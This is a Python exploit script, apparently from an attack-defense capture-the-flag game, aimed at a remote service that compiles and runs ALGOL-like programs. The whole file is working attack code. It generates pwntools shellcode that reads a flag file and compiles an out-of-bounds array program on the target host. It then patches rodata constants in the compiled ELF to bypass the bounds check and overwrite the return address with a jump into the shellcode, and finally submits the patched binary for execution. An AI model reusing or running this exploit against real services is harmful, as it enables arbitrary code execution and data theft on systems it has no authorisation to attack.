import utils
import pwn
import re
from base64 import b64encode

# Reading and writing an array out of bounds by using constant indexes and rewriting rodata.
# This works cause the check and the actual array access will use two constants in rodata.
# expects compiler using untampered stack frame layout
# expects '-z noseparate-code' used in linker

# 'arr' in main() is the array to be read/write out of bounds.
# The values 2 and 3 are replaced later in rodata.
# Expected offset from 'arr' to return address is 4.
# add offset return address to the shellcode to return address.
# The part after the main-call should not be executed, cause the shellcode calls exit().
exploit_code = """
'BEGIN'
  'INTEGER' 'PROCEDURE' main;
    'INTEGER' 'ARRAY' arr[4];
  'BEGIN'
    arr[3] := arr[2] + %d;
  'END';
  'STRING' sc[%d];
  main;
  sc := "%s";
  outinteger(sc[12])
'END'
"""

pattern_shellcode = pwn.p64(0xFEFEFEFEFEFEFEFE)
# mustn't be larger 2 ** 63 - 1
pattern = 0x3F3F3F3F3F3F3F3F

def main(host, flag_id):
    shellcode = pwn.shellcraft.cat2(flag_id) + pwn.shellcraft.exit(0)
    shellcode = pwn.asm(shellcode)

    shellcode = pattern_shellcode + shellcode
    shellcodeStr = utils.shellcodeToStringLiteral(shellcode)

    # compile code with pattern for the offset constants and shellcode
    code = exploit_code % (pattern, len(shellcode) + 1, shellcodeStr)
    json, elf = utils.compileCode(host, code)

    # get value of return address in main
    mainRet_off = utils.getOffsetForReturnFromFirstCall(elf, "$top")
    print("mainRet_off", hex(mainRet_off))

    # find shellcode in strings
    shellcode_off = utils.findInStrings(elf, pattern_shellcode)
    shellcode_off += len(pattern_shellcode)
    print("shellcode_off", hex(shellcode_off))

    # patch offset in rodata
    assert utils.PATCH_RODATA_OR_RECOMPILE
    json = utils.replacePatternWith(host, json, elf, code, replacements=[
        # pattern is the offset from retAddr to shellcode
        (pattern, shellcode_off - mainRet_off)
    ])
    
    # patch array index constants in rodata
    code = elf.disasm(elf.symbols["main"], 200)
    # find movs which load array index after index check
    match = re.findall(r"mov    rax, QWORD PTR \[rip\+0x([0-9a-f]*).*\n ([0-9a-f]*):", code)
    assert len(match) == 2
    new_indexes = {
        2: 4,
        3: 4,
    }
    for off1, off2 in match:
        index_constant_off = int(off1, 16) + int(off2, 16)
        index_constant = elf.u64(index_constant_off)
        new_idx = new_indexes[index_constant]
        elf.p64(index_constant_off, new_idx)

    # base64 encode patched elf
    json["binary"] = b64encode(elf.data).decode()
    # execute binary
    stdout = utils.executeAndRetStdout(host, json)
    print(stdout)


utils.launchExploit(main)
